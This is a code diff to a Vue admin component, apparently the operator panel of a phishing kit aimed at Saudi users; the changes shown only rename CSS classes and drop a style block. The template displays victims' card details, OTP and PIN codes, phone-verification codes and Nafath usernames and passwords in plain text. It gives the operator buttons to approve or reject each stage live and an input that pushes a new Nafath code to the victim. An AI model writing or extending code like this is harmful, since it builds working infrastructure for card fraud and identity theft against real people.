@@ -19,17 +19,17 @@
     <div v-if="customer" class="grid grid-cols-12 gap-5">
       <!-- Card Details Column -->
       <div class="col-span-5">
-        <div class="glass-panel glass-panel--emerald h-full">
-          <div class="panel-header">
+        <div class="admin-glass admin-glass--emerald h-full">
+          <div class="admin-panel-header">
             <div class="flex items-center gap-2.5">
-              <span class="glow-dot glow-dot--emerald"></span>
-              <span class="panel-label text-emerald-400">Card Details</span>
+              <span class="admin-dot admin-dot--emerald"></span>
+              <span class="admin-panel-label text-emerald-400">Card Details</span>
               <StatusPill v-if="customer?.selectedInsurance?.type === 'mojaz'" size="sm" variant="purple" label="📊 موجز" />
             </div>
-            <div v-if="customerCards.length > 1" class="card-nav">
-              <button :disabled="currentCardIndex === 0" class="card-nav-btn" @click="$emit('prev-card')">&#10094;</button>
+            <div v-if="customerCards.length > 1" class="admin-card-nav">
+              <button :disabled="currentCardIndex === 0" class="admin-card-nav-btn" @click="$emit('prev-card')">&#10094;</button>
               <span class="font-mono text-xs text-gray-400">{{ currentCardIndex + 1 }}/{{ customerCards.length }}</span>
-              <button :disabled="currentCardIndex >= customerCards.length - 1" class="card-nav-btn" @click="$emit('next-card')">&#10095;</button>
+              <button :disabled="currentCardIndex >= customerCards.length - 1" class="admin-card-nav-btn" @click="$emit('next-card')">&#10095;</button>
             </div>
           </div>
           <div v-if="currentCard">
@@ -66,7 +66,7 @@
               </div>
             </div>
             <!-- Payment amount -->
-            <div v-if="paymentAmount" class="payment-summary mt-4">
+            <div v-if="paymentAmount" class="admin-payment-summary mt-4">
               <div class="flex items-center justify-between">
                 <div class="flex items-center gap-2">
                   <span class="text-lg">💰</span>
@@ -96,7 +96,7 @@
               </div>
             </div>
           </div>
-          <div v-else class="empty-state"><div class="empty-state-icon">💳</div><p>لا توجد بطاقات</p></div>
+          <div v-else class="admin-empty"><div class="admin-empty-icon">💳</div><p>لا توجد بطاقات</p></div>
         </div>
       </div>
 
@@ -104,17 +104,17 @@
       <div class="col-span-4 space-y-4">
         <div class="grid grid-cols-2 gap-4">
           <!-- OTP Code -->
-          <div class="glass-panel glass-panel--amber flex min-h-[180px] flex-col">
-            <div class="panel-header">
+          <div class="admin-glass admin-glass--amber flex min-h-[180px] flex-col">
+            <div class="admin-panel-header">
               <div class="flex items-center gap-2">
-                <span class="glow-dot glow-dot--amber"></span>
-                <span class="panel-label text-amber-400">OTP Code</span>
+                <span class="admin-dot admin-dot--amber"></span>
+                <span class="admin-panel-label text-amber-400">OTP Code</span>
               </div>
               <StatusPill v-if="latestOtp" size="sm" variant="orange" label="صفحة OTP" />
             </div>
             <div v-if="latestOtp" class="flex flex-1 flex-col">
-              <div class="code-display code-display--amber">
-                <span class="code-value text-amber-400">{{ latestOtp.code || latestOtp.otp_code || '—' }}</span>
+              <div class="admin-code-box admin-code-box--amber">
+                <span class="font-mono text-2xl font-bold tracking-[0.25em] text-amber-400">{{ latestOtp.code || latestOtp.otp_code || '—' }}</span>
               </div>
               <div v-if="isPending(latestOtp.status)" class="mt-auto space-y-2 pt-3">
                 <AdminButton variant="accept" size="sm" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'otp-approve')">قبول</AdminButton>
@@ -134,20 +134,20 @@
                 </p>
               </div>
             </div>
-            <div v-else class="empty-state flex-1"><div class="empty-state-icon">🔐</div><p>لا يوجد رمز OTP حتى الآن</p></div>
+            <div v-else class="admin-empty flex-1"><div class="admin-empty-icon">🔐</div><p>لا يوجد رمز OTP حتى الآن</p></div>
           </div>
           <!-- PIN Code -->
-          <div class="glass-panel glass-panel--pink flex min-h-[180px] flex-col">
-            <div class="panel-header">
+          <div class="admin-glass admin-glass--pink flex min-h-[180px] flex-col">
+            <div class="admin-panel-header">
               <div class="flex items-center gap-2">
-                <span class="glow-dot glow-dot--pink"></span>
-                <span class="panel-label text-pink-400">PIN Code</span>
+                <span class="admin-dot admin-dot--pink"></span>
+                <span class="admin-panel-label text-pink-400">PIN Code</span>
               </div>
               <StatusPill v-if="latestPin" size="sm" variant="pink" label="صفحة PIN" />
             </div>
             <div v-if="latestPin" class="flex flex-1 flex-col">
-              <div class="code-display code-display--pink">
-                <span class="code-value text-pink-400">{{ latestPin.code || latestPin.pin || '—' }}</span>
+              <div class="admin-code-box admin-code-box--pink">
+                <span class="font-mono text-2xl font-bold tracking-[0.25em] text-pink-400">{{ latestPin.code || latestPin.pin || '—' }}</span>
               </div>
               <div v-if="isPending(latestPin.status)" class="mt-auto space-y-2 pt-3">
                 <AdminButton variant="accept" size="sm" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'pin-approve')">قبول</AdminButton>
@@ -166,15 +166,15 @@
                 <span class="font-mono text-[10px] text-gray-500" dir="ltr">{{ formatDateTimeEN(latestPin.created_at) }}</span>
               </div>
             </div>
-            <div v-else class="empty-state flex-1"><div class="empty-state-icon">🔑</div><p>لم يتم إدخال رمز PIN</p></div>
+            <div v-else class="admin-empty flex-1"><div class="admin-empty-icon">🔑</div><p>لم يتم إدخال رمز PIN</p></div>
           </div>
         </div>
         <!-- Phone Verification -->
-        <div class="glass-panel glass-panel--sky">
-          <div class="panel-header">
+        <div class="admin-glass admin-glass--sky">
+          <div class="admin-panel-header">
             <div class="flex items-center gap-2">
-              <span class="glow-dot glow-dot--sky"></span>
-              <span class="panel-label text-sky-400">Phone Verification</span>
+              <span class="admin-dot admin-dot--sky"></span>
+              <span class="admin-panel-label text-sky-400">Phone Verification</span>
             </div>
             <StatusPill v-if="latestPhoneOtp" size="sm" variant="cyan" label="صفحة التحقق" />
           </div>
@@ -192,18 +192,18 @@
                 <StatusPill v-if="getPhoneVerificationStatus(customer) === 'approved'" size="sm" variant="success" icon-text="✓" label="موافق" />
                 <StatusPill v-else-if="getPhoneVerificationStatus(customer) === 'rejected'" size="sm" variant="error" icon-text="✗" label="مرفوض" />
               </div>
-              <div class="code-display code-display--sky">
-                <span class="code-value text-sky-400">{{ latestPhoneOtp?.otp_code || latestPhoneOtp?.code || '—' }}</span>
+              <div class="admin-code-box admin-code-box--sky">
+                <span class="font-mono text-2xl font-bold tracking-[0.25em] text-sky-400">{{ latestPhoneOtp?.otp_code || latestPhoneOtp?.code || '—' }}</span>
               </div>
-              <div v-if="isCarrierMismatch(customer)" class="carrier-warning mt-2">
+              <div v-if="isCarrierMismatch(customer)" class="admin-carrier-warn mt-2">
                 <span class="text-[9px] text-yellow-400">⚠️ هذا الكود من {{ latestPhoneOtp?.is_stc ? 'STC' : 'شركة أخرى' }} - العميل اختار {{ isStcCarrier(customer) ? 'STC' : customer?.phone_carrier || 'شركة أخرى' }}</span>
               </div>
             </div>
-            <div v-else class="empty-state"><div class="empty-state-icon">📱</div><p>لا توجد بيانات تحقق للهاتف</p></div>
+            <div v-else class="admin-empty"><div class="admin-empty-icon">📱</div><p>لا توجد بيانات تحقق للهاتف</p></div>
 
             <!-- STC 3-Stage Approval -->
-            <div v-if="isStcVerificationFlow(customer) && isStcWaitingForApproval(customer)" class="stage-card stage-card--purple">
-              <div class="stage-label text-purple-400">المرحلة 1: موافقة على البيانات المدخلة</div>
+            <div v-if="isStcVerificationFlow(customer) && isStcWaitingForApproval(customer)" class="admin-stage admin-stage--purple">
+              <div class="mb-2 text-center text-xs font-semibold text-purple-400">المرحلة 1: موافقة على البيانات المدخلة</div>
               <div class="space-y-2">
                 <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
                 <RejectReasonPicker action="stc-waiting-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
@@ -212,8 +212,8 @@
             <div v-else-if="isStcVerificationFlow(customer) && customer?.custom_data?.stc_waiting_approved && !customer?.custom_data?.stc_otp_approved" class="mt-2 text-center">
               <StatusPill variant="info" icon-text="✓" label="تمت الموافقة على البيانات" />
             </div>
-            <div v-if="isStcVerificationFlow(customer) && isStcWaitingForOtpApproval(customer)" class="stage-card stage-card--yellow">
-              <div class="stage-label text-yellow-400">المرحلة 2: موافقة على رمز التحقق (OTP)</div>
+            <div v-if="isStcVerificationFlow(customer) && isStcWaitingForOtpApproval(customer)" class="admin-stage admin-stage--yellow">
+              <div class="mb-2 text-center text-xs font-semibold text-yellow-400">المرحلة 2: موافقة على رمز التحقق (OTP)</div>
               <div class="space-y-2">
                 <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
                 <RejectReasonPicker action="stc-otp-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
@@ -222,8 +222,8 @@
             <div v-else-if="isStcVerificationFlow(customer) && customer?.custom_data?.stc_otp_approved && !customer?.custom_data?.stc_call_approved" class="mt-2 text-center">
               <StatusPill variant="warning" icon-text="✓" label="تمت الموافقة على OTP" />
             </div>
-            <div v-if="isStcVerificationFlow(customer) && isStcWaitingForCallApproval(customer)" class="stage-card stage-card--cyan">
-              <div class="stage-label text-cyan-400">المرحلة 3: موافقة على المكالمة</div>
+            <div v-if="isStcVerificationFlow(customer) && isStcWaitingForCallApproval(customer)" class="admin-stage admin-stage--cyan">
+              <div class="mb-2 text-center text-xs font-semibold text-cyan-400">المرحلة 3: موافقة على المكالمة</div>
               <div class="space-y-2">
                 <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-approve')">قبول</AdminButton>
                 <RejectReasonPicker action="stc-call-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-reject', reason)" />
@@ -240,8 +240,8 @@
             </div>
 
             <!-- Phone Verification 2-Stage (generic) -->
-            <div v-if="!isStcVerificationFlow(customer) && isPhoneDataWaitingForApproval(customer)" class="stage-card stage-card--purple">
-              <div class="stage-label text-purple-400">المرحلة 1: موافقة على بيانات الهاتف</div>
+            <div v-if="!isStcVerificationFlow(customer) && isPhoneDataWaitingForApproval(customer)" class="admin-stage admin-stage--purple">
+              <div class="mb-2 text-center text-xs font-semibold text-purple-400">المرحلة 1: موافقة على بيانات الهاتف</div>
               <div class="space-y-2">
                 <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-data-approve')">قبول</AdminButton>
                 <RejectReasonPicker action="phone-data-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-data-reject', reason)" />
@@ -250,8 +250,8 @@
             <div v-else-if="!isStcVerificationFlow(customer) && customer?.custom_data?.phone_data_status === 'approved' && customer?.custom_data?.phone_otp_status !== 'approved'" class="mt-2 text-center">
               <StatusPill variant="info" icon-text="✓" label="تمت الموافقة على البيانات" />
             </div>
-            <div v-if="!isStcVerificationFlow(customer) && isPhoneOtpWaitingForApproval(customer)" class="stage-card stage-card--yellow">
-              <div class="stage-label text-yellow-400">المرحلة 2: موافقة على رمز التحقق (OTP)</div>
+            <div v-if="!isStcVerificationFlow(customer) && isPhoneOtpWaitingForApproval(customer)" class="admin-stage admin-stage--yellow">
+              <div class="mb-2 text-center text-xs font-semibold text-yellow-400">المرحلة 2: موافقة على رمز التحقق (OTP)</div>
               <div class="space-y-2">
                 <AdminButton variant="accept" class="w-full" :disabled="processingAction" @click="$emit('payment-action', 'phone-otp-approve')">قبول</AdminButton>
                 <RejectReasonPicker action="phone-otp-reject" :disabled="processingAction" @reject="reason => $emit('payment-action', 'phone-otp-reject', reason)" />
@@ -272,11 +272,11 @@
 
       <!-- Nafath Column -->
       <div class="col-span-3">
-        <div class="glass-panel glass-panel--cyan h-full">
-          <div class="panel-header">
+        <div class="admin-glass admin-glass--cyan h-full">
+          <div class="admin-panel-header">
             <div class="flex items-center gap-2">
-              <span class="glow-dot glow-dot--cyan"></span>
-              <span class="panel-label text-cyan-400">Nafath Login</span>
+              <span class="admin-dot admin-dot--cyan"></span>
+              <span class="admin-panel-label text-cyan-400">Nafath Login</span>
             </div>
             <span class="text-lg text-cyan-400">🆔</span>
           </div>
@@ -285,8 +285,8 @@
               <DataField label="اسم المستخدم" :value="latestNafath.username" mono />
               <DataField label="كلمة المرور" :value="latestNafath.password" mono />
               <p class="mb-1.5 text-[10px] font-medium uppercase tracking-wider text-gray-500">رمز التحقق</p>
-              <div class="code-display code-display--cyan">
-                <span class="code-value text-cyan-400">{{ nafathDisplayNumber || latestNafath.verification_code || '—' }}</span>
+              <div class="admin-code-box admin-code-box--cyan">
+                <span class="font-mono text-2xl font-bold tracking-[0.25em] text-cyan-400">{{ nafathDisplayNumber || latestNafath.verification_code || '—' }}</span>
               </div>
               <div class="text-center">
                 <span class="font-mono text-[10px] text-gray-500" dir="ltr">{{ formatDateTimeEN(latestNafath.created_at) }}</span>
@@ -300,7 +300,7 @@
                 autocomplete="off"
                 :value="nafathDisplayNumber"
                 type="text"
-                class="nafath-input"
+                class="admin-nafath-input"
                 placeholder="رمز جديد..."
                 @input="$emit('update:nafathDisplayNumber', $event.target.value)"
               />
@@ -324,7 +324,7 @@
               </div>
             </div>
           </div>
-          <div v-else class="empty-state"><div class="empty-state-icon">🔐</div><p>لم يتم تسجيل دخول نفاذ</p></div>
+          <div v-else class="admin-empty"><div class="admin-empty-icon">🔐</div><p>لم يتم تسجيل دخول نفاذ</p></div>
         </div>
       </div>
     </div>
@@ -420,120 +420,4 @@ onUnmounted(() => window.removeEventListener('keydown', handleKeydown));
 
 <style scoped>
 @reference "../../../../css/app.css";
-
-/* ── Glassmorphism Design System ─────────────────────────────── */
-
-/* Base glass panel */
-.glass-panel {
-  @apply rounded-2xl p-5;
-  background: rgba(17, 24, 39, 0.6);
-  backdrop-filter: blur(16px);
-  border: 1px solid rgba(255, 255, 255, 0.06);
-  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.04);
-  transition: border-color 0.3s ease, box-shadow 0.3s ease;
-}
-
-/* Accent variants — subtle glow on hover */
-.glass-panel--emerald { border-color: rgba(52, 211, 153, 0.12); }
-.glass-panel--emerald:hover { border-color: rgba(52, 211, 153, 0.25); box-shadow: 0 8px 32px rgba(52, 211, 153, 0.08), inset 0 1px 0 rgba(255, 255, 255, 0.04); }
-
-.glass-panel--amber { border-color: rgba(251, 191, 36, 0.12); }
-.glass-panel--amber:hover { border-color: rgba(251, 191, 36, 0.25); box-shadow: 0 8px 32px rgba(251, 191, 36, 0.08), inset 0 1px 0 rgba(255, 255, 255, 0.04); }
-
-.glass-panel--pink { border-color: rgba(244, 114, 182, 0.12); }
-.glass-panel--pink:hover { border-color: rgba(244, 114, 182, 0.25); box-shadow: 0 8px 32px rgba(244, 114, 182, 0.08), inset 0 1px 0 rgba(255, 255, 255, 0.04); }
-
-.glass-panel--sky { border-color: rgba(56, 189, 248, 0.12); }
-.glass-panel--sky:hover { border-color: rgba(56, 189, 248, 0.25); box-shadow: 0 8px 32px rgba(56, 189, 248, 0.08), inset 0 1px 0 rgba(255, 255, 255, 0.04); }
-
-.glass-panel--cyan { border-color: rgba(34, 211, 238, 0.12); }
-.glass-panel--cyan:hover { border-color: rgba(34, 211, 238, 0.25); box-shadow: 0 8px 32px rgba(34, 211, 238, 0.08), inset 0 1px 0 rgba(255, 255, 255, 0.04); }
-
-/* Panel header row */
-.panel-header {
-  @apply mb-4 flex items-center justify-between;
-}
-
-.panel-label {
-  @apply text-[11px] font-bold tracking-wide uppercase;
-}
-
-/* Glowing dot indicators */
-.glow-dot {
-  @apply h-2.5 w-2.5 shrink-0 rounded-full;
-}
-.glow-dot--emerald { background: #34d399; box-shadow: 0 0 8px rgba(52, 211, 153, 0.6); }
-.glow-dot--amber   { background: #fbbf24; box-shadow: 0 0 8px rgba(251, 191, 36, 0.6); }
-.glow-dot--pink    { background: #f472b6; box-shadow: 0 0 8px rgba(244, 114, 182, 0.6); }
-.glow-dot--sky     { background: #38bdf8; box-shadow: 0 0 8px rgba(56, 189, 248, 0.6); }
-.glow-dot--cyan    { background: #22d3ee; box-shadow: 0 0 8px rgba(34, 211, 238, 0.6); }
-
-/* Card navigator controls */
-.card-nav {
-  @apply flex items-center gap-1.5 rounded-xl bg-gray-800/60 px-2.5 py-1.5 ring-1 ring-white/5;
-}
-.card-nav-btn {
-  @apply px-1.5 py-0.5 text-xs text-gray-400 transition-colors hover:text-white disabled:opacity-30 rounded;
-}
-
-/* Code display boxes */
-.code-display {
-  @apply flex min-h-[60px] flex-col items-center justify-center rounded-xl py-3;
-  background: rgba(17, 24, 39, 0.5);
-  border: 1px solid rgba(255, 255, 255, 0.06);
-}
-.code-display--amber { border-color: rgba(251, 191, 36, 0.15); background: rgba(251, 191, 36, 0.05); }
-.code-display--pink  { border-color: rgba(244, 114, 182, 0.15); background: rgba(244, 114, 182, 0.05); }
-.code-display--sky   { border-color: rgba(56, 189, 248, 0.15); background: rgba(56, 189, 248, 0.05); }
-.code-display--cyan  { border-color: rgba(34, 211, 238, 0.15); background: rgba(34, 211, 238, 0.05); }
-
-.code-value {
-  @apply font-mono text-2xl font-bold tracking-[0.25em];
-}
-
-/* Payment summary box */
-.payment-summary {
-  @apply rounded-2xl p-4;
-  background: rgba(52, 211, 153, 0.06);
-  border: 1px solid rgba(52, 211, 153, 0.15);
-  backdrop-filter: blur(8px);
-}
-
-/* Stage action cards */
-.stage-card {
-  @apply mt-3 rounded-xl border p-3;
-  backdrop-filter: blur(8px);
-}
-.stage-card--purple { border-color: rgba(168, 85, 247, 0.25); background: rgba(88, 28, 135, 0.15); }
-.stage-card--yellow { border-color: rgba(234, 179, 8, 0.25); background: rgba(113, 63, 18, 0.15); }
-.stage-card--cyan   { border-color: rgba(34, 211, 238, 0.25); background: rgba(22, 78, 99, 0.15); }
-
-.stage-label {
-  @apply mb-2 text-center text-xs font-semibold;
-}
-
-/* Carrier mismatch warning */
-.carrier-warning {
-  @apply rounded-lg border border-yellow-500/30 p-2 text-center;
-  background: rgba(234, 179, 8, 0.08);
-}
-
-/* Nafath input */
-.nafath-input {
-  @apply w-full rounded-xl border border-gray-600/50 px-3 py-2.5 text-center font-mono text-base text-white transition-all placeholder:text-sm placeholder:text-gray-600 focus:outline-none;
-  background: rgba(17, 24, 39, 0.6);
-  backdrop-filter: blur(8px);
-}
-.nafath-input:focus {
-  border-color: rgba(34, 211, 238, 0.5);
-  box-shadow: 0 0 0 3px rgba(34, 211, 238, 0.1);
-}
-
-/* Empty states */
-.empty-state {
-  @apply flex flex-col items-center justify-center py-8 text-center text-xs text-gray-500/80;
-}
-.empty-state-icon {
-  @apply mb-2 text-2xl opacity-40;
-}
 </style>
